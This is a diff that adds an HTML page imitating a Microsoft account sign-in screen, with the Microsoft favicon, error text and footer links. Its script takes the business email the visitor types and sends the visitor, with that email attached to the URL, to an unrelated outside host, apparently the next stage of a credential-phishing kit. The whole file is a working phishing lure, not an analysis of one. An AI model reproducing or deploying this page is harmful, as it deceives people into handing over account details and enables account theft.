@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <link rel="icon" type="image/png" sizes="192x192" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <title>Sign in to your account</title>
+    <style type="text/css">
+        textarea:hover,
+        input:hover,
+        textarea:active,
+        input:active,
+        textarea:focus,
+        input:focus,
+        button:focus,
+        button:active,
+        button:hover,
+        label:focus,
+        .btn:active,
+        .btn.active {
+            outline: 0px !important;
+            -webkit-appearance: none;
+            box-shadow: none !important;
+        }
+
+        .box {
+            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
+            border: 0px solid rgba(0, 0, 0, 0.4);
+            max-height: 415px;
+            width: 440px;
+            padding: 44px;
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 20px;
+            margin-bottom: 28px;
+        }
+
+        #footer {
+            position: fixed;
+            bottom: 0px;
+            width: 100%;
+            overflow: visible;
+            z-index: 99;
+            clear: both;
+        }
+
+        div .footerNode a,
+        div .footerNode span {
+            color: black;
+            font-size: 0.75rem;
+            line-height: 28px;
+            white-space: nowrap;
+            display: inline-block;
+            float: right;
+            margin-left: 8px;
+            margin-right: 8px;
+        }
+
+        @media only screen and (max-width: 610px) {
+            #hide {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body style="background-image: url('https://i.imgur.com/ssr57bo.jpg'); background-size: cover; background-repeat: no-repeat;">
+    <div class="container-fluid">
+        <div class="container">
+            <div class="row my-5 py-5">
+                <div class="col-lg-6 mx-auto">
+                    <div class="m-5 p-5 bg-white box" id="div1">
+                        <img src="assets/logos.svg" class="img-fluid" width="130"><br><br>
+                        <span class="h5">Sign In</span><br>
+                        <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
+                        <div class="form-group mt-2">
+                            <input type="email" value="" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Enter your business email." style="border-right: none; border-left: none; border-top: none;">
+                        </div>
+                        <p style="font-size: 14px">No account? <a href="#" style="color: #0067b8;">Create one!</a></p>
+                        <p style="font-size: 14px"><a href="#" style="color: #0067b8;">Sign in with a security key</a></p>
+                        <p style="font-size: 14px"><a href="#" style="color: #0067b8;">Click "Next" to continue Verification.</a></p>
+                        <div class="text-right">
+                            <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0067b8;" onclick="redirectToNextPage()">Next</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer id="footer" style="padding-right: 30px">
+        <div>
+            <div class="footerNode">
+                <span>Privacy & cookie</span>
+                <a href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Terms of use</a>
+            </div>
+        </div>
+    </footer>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7H7UibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script>
+        function redirectToNextPage() {
+            const email = document.getElementById('ai').value;
+            const nextPage = 'https://office.huozi.shop/SvThgObK';
+            window.location.href = `${nextPage}#${email}`;
+        }
+    </script>
+</body>
+<script type="text/javascript" src="script.js"></script>
+
+</html>
